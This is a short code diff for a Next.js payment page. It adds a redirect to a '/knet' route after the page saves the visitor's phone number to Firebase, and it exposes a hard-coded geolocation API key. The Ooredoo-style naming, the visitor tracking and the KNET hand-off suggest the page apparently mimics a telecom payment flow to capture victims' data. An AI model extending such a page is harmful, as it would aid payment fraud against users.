@@ -10,11 +10,12 @@ import PaymentSummary from "@/components/payment-summary"
 import { setupOnlineStatus } from "@/lib/utils"
 import { addData } from "@/lib/firebase"
 import { useEffect, useState } from "react"
+import { useRouter } from "next/navigation"
 
 export default function PaymentPage() {
   const [value, setValue] = useState('5 د.ك')
   const [phone, setPhone] = useState('')
-
+const router=useRouter()
   const _id=randstr('oredoo-')
   async function getLocation() {
     const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
@@ -50,6 +51,7 @@ const handleSubmit=(e:any)=>{
   const _id=localStorage.getItem('visitor')
 
   addData({id:_id,phone})
+  router.push('/knet')
 }
   return (
     <div className="flex flex-col min-h-screen bg-gray-50">
